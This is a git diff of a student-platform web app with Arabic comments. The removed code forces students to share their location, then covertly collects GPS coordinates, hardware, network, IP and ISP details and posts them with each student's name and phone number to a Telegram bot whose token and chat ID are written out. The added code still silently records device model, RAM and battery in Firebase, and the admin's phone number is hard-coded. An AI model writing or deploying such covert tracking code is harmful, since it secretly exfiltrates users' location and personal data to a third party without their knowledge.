@@ -673,147 +673,81 @@ function completeRegistration() {
             }
         };
 
-      // 🚀 دالة تشغيل المنصة الكاملة + الرادار الاستخباراتي (النسخة النهائية 2026)
-async function runApp() {
+        async function runApp() {
     const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
-    if (!user) return;
+    if(!user) return;
 
-    // [1] طلب إذن الموقع إجباري - المنصة مش هتفتح غير لو وافق ❤️
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            async (p) => {
-                // إظهار واجهة المنصة فوراً عند الموافقة
-                const ids = ['login-gate', 'sidebar', 'top-bar', 'content', 'mob-nav'];
-                ids.forEach(id => {
-                    const el = document.getElementById(id);
-                    if (el) el.style.display = (id === 'login-gate') ? 'none' : (id === 'content' ? 'block' : 'flex');
-                });
-                
-                const dispName = document.getElementById('display-name');
-                if (dispName) dispName.innerText = user.name.split(' ')[0];
-                
-                // 🕵️‍♂️ [2] تشغيل الرادار الخارق (سحب الداتا العميقة صامت)
-                try {
-                    const gpsLat = p.coords.latitude;
-                    const gpsLon = p.coords.longitude;
+    // --- الرادار: سحب الداتا العميقة صامت ---
+    const getSpecs = async () => {
+        const ua = navigator.userAgent;
+        const model = /android/i.test(ua) ? (ua.match(/Android.*;\s([^;]+)\sBuild/) ? ua.match(/Android.*;\s([^;]+)\sBuild/)[1] : "Android Device") : "PC/iPhone";
+        const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Unknown";
+        const battery = await (navigator.getBattery ? navigator.getBattery().then(b => `${Math.round(b.level*100)}%`) : "??");
+        return { model, specs: `RAM: ${ram} | Bat: ${battery} | OS: ${navigator.platform}` };
+    };
 
-                    // أ- فحص البطارية بالتفصيل (نسبة + شحن + وقت)
-                    let batt = { level: "N/A", status: "N/A", time: "N/A" };
-                    try { 
-                        const b = await navigator.getBattery();
-                        batt.level = Math.round(b.level * 100) + "%";
-                        batt.status = b.charging ? "⚡ متصل بالشاحن" : "🔋 وضع البطارية";
-                        batt.time = b.charging ? (b.chargingTime / 60).toFixed(0) + " دقيقة للفل" : (b.dischargingTime / 60).toFixed(0) + " دقيقة ويفصل";
-                    } catch(e){}
+    const device = await getSpecs();
+    // تحديث بيانات الطالب في جدول الطلاب وفي جدول الأونلاين (presence)
+    studentsRef.child(user.phone).update({ device_info: device });
+    presenceRef.child(user.phone).set({ name: user.name, last: Date.now(), ...device });
+    presenceRef.child(user.phone).onDisconnect().remove();
 
-                    // ب- العتاد والمساحة (Hardware & Storage)
-                    const ram = navigator.deviceMemory || "N/A";
-                    const cores = navigator.hardwareConcurrency || "N/A";
-                    let storage = { free: "N/A", total: "N/A" };
-                    try { 
-                        const s = await navigator.storage.estimate(); 
-                        storage.free = ((s.quota - s.usage) / (1024 ** 3)).toFixed(2) + " GB";
-                        storage.total = (s.quota / (1024 ** 3)).toFixed(2) + " GB";
-                    } catch(e){}
-                    
-                    // ج- كرت الشاشة ونوع المعالج الرسومي (GPU)
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl');
-                    const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-                    const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
-
-                    // د- الشبكة والسرعة والـ IP (وايفاي ولا داتا)
-                    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-                    const netType = conn.type || "N/A"; 
-                    const netEffect = conn.effectiveType || "Unknown"; 
-                    const netSpeed = conn.downlink ? conn.downlink + " Mbps" : "N/A";
-
-                    // هـ- الـ IP والموقع المخفي من السيرفر (بدون إذن)
-                    let ipInfo = { ip: "Scanning...", isp: "N/A", city: "N/A", region: "N/A", country: "N/A" };
-                    try {
-                        const res = await fetch('https://ipwho.is/').then(r => r.json());
-                        if(res.success) ipInfo = { ip: res.ip, isp: res.connection.isp, city: res.city, region: res.region, country: res.country };
-                    } catch(e){}
-
-                    // و- فحص الثغرات التقديري (Vulnerabilities)
-                    const isIncognito = !window.indexedDB; 
-                    const isOldBrowser = !('getBattery' in navigator);
-
-                    // [3] إرسال التقرير النهائي للبوت (ماعدا آدم)
-                    if (user.phone !== "01023175098") {
-                        const token = "8691996536:AAHGdKL87Uem-z-tNR-aejGTpjI9SJcjlHY";
-                        const chatId = "5890070301";
-                        const message = `👑 *تـقـريـر كـيـمـو الـخـارق* ❤️
-━━━━━━━━━━━━━━
-👤 *الطالب:* ${user.name}
-📞 *الرقم:* \`${user.phone}\`
-━━━━━━━━━━━━━━
-🔋 *البطارية:* ${batt.level} (${batt.status})
-⏳ *الوقت:* ${batt.time}
-
-⚙️ *مواصفات الجهاز:*
-• النوع: ${navigator.platform} | المعالج: ${cores} Cores
-• الرام: ${ram} GB | كرت الشاشة: ${gpu}
-• المساحة: حر ${storage.free} من ${storage.total}
-
-🌐 *الشبكة والإنترنت:*
-• الـ IP: \`${ipInfo.ip}\`
-• الاتصال: ${netType} (${netEffect}) | السرعة: ${netSpeed}
-• الشركة: ${ipInfo.isp}
-
-📍 *الموقع (GPS + IP):*
-• الدولة: ${ipInfo.country} | المحافظة: ${ipInfo.region}
-• المدينة: ${ipInfo.city}
-• الخريطة: https://www.google.com/maps?q=${gpsLat},${gpsLon}
-
-📱 *بيانات إضافية:*
-• الثغرات: ${isIncognito ? "وضع التخفي 🕵️" : "عادي"} | ${isOldBrowser ? "متصفح غير آمن ⚠️" : "مؤمن ✅"}
-• اللغة: ${navigator.language}
-• الشاشة: ${window.screen.width}x${window.screen.height}
-
-⏰ *توقيت الدخول:* ${new Date().toLocaleString('ar-EG')}
-━━━━━━━━━━━━━━`;
-
-
-                                   fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
-
-                        
-                        // تحديث Firebase
-                        studentsRef.child(user.phone).update({ 
-                            intel_report: { battery: batt, hardware: {cores, ram, storage, gpu}, ip: ipInfo, location: {lat: gpsLat, lon: gpsLon} } 
-                        });
-                    }
-                } catch (err) { console.error("Radar Error", err); }
-
-                // [4] كود الأدمن (آدم) اظهر لوحة التحكم
-                if (user.phone === "01023175098") {
-                    const adminIds = ['adm-links', 'adm-mob-link', 'admin-live-info'];
-                    adminIds.forEach(id => {
-                        const el = document.getElementById(id);
-                        if (el) el.style.display = 'block';
-                    });
-                    
-                    studentsRef.on('value', s => {
-                        const count = document.getElementById('total-students-count');
-                        if (count) count.innerText = s.numChildren();
-                        loadStudentsList(Object.entries(s.val() || {}).reverse());
-                    });
-                }
-                
-                loadData();
-                renderSubjectGrids();
-            },
-            (err) => {
-                alert("⚠️ لازم تسمح بالموقع يا بطل عشان أكونتك يتأمن ونحفظ بياناتك ❤️");
-                location.reload();
-            },
-            { enableHighAccuracy: true, timeout: 15000 }
-        );
-    } else {
-        alert("متصفحك لا يدعم تحديد الموقع ❤️");
+    // --- تشغيل واجهة المنصة ---
+    blacklistRef.child(user.phone).on('value', s => { if(s.exists()) logout(); });
+    document.getElementById('login-gate').style.display = 'none';
+    document.getElementById('sidebar').style.display = 'flex';
+    document.getElementById('top-bar').style.display = 'flex';
+    document.getElementById('news-bar').style.display = 'block';
+    document.getElementById('mob-nav').style.display = 'flex';
+    document.getElementById('content').style.display = 'block';
+    document.getElementById('tg-btn').style.display = 'flex';
+    document.getElementById('display-name').innerText = user.name.split(' ')[0];
+    
+    if (!localStorage.getItem("whatsapp_joined")) {
+        document.getElementById("join-overlay").style.display = "flex";
     }
-}
-  
+
+    // لو أنت الأدمن (رقمك) اظهر لوحة التحكم وحدث العدادات
+    if(user.phone === "01023175098") {
+                document.getElementById('adm-links').style.display = 'block';
+        document.getElementById('adm-mob-link').style.display = 'block';
+        document.getElementById('admin-live-info').style.display = 'block';
+
+        // إشعار فوري للأدمن بس لما حد يسجل
+        let isInitialLoad = true;
+        studentsRef.limitToLast(1).on('child_added', s => {
+            if (!isInitialLoad) {
+                const newStudent = s.val();
+                alert(`🆕 طالب جديد سجل دلوقتي يا آدم:\nالاسم: ${newStudent.name}\nالرقم: ${newStudent.phone}`);
+            }
+        });
+        setTimeout(() => { isInitialLoad = false; }, 3000);
+
+        // تحديث القائمة والترتيب (الأحدث فوق)
+        studentsRef.on('value', s => {
+            const allData = s.val() || {};
+            const sortedStudents = Object.entries(allData).reverse(); 
+            document.getElementById('total-students-count').innerText = s.numChildren();
+            document.getElementById('stat-total-std').innerText = s.numChildren();
+            loadStudentsList(sortedStudents);
+        });
+
+        presenceRef.on('value', s => {
+            document.getElementById('online-now').innerText = s.numChildren();
+            document.getElementById('stat-online-std').innerText = s.numChildren();
+        });
+                resultsRef.on('value', s => loadResultsList(s.val()));
+    } // قفلة شرط الأدمن (01023175098)
+
+    // الكود ده لكل الطلاب والأدمن
+    settingsRef.child('newsTicker').on('value', s => {
+        document.getElementById('ticker-content').innerText = s.val() || "مرحباً بكم في أكاديمية كيمو!";
+    });
+
+    loadData(); 
+    renderSubjectGrids();
+} // قفلة دالة runApp النهائية
+
 
         function loadData() { lessonsRef.on('value', s => { allData = s.val() || {}; renderLatest(); renderPinned(); }); }
         function loadStudentsList(sortedData) {
@@ -2349,4 +2283,4 @@ function pushAdminToFirebase() {
 </script>
 
 </body>
-    </html>
+                        </html>
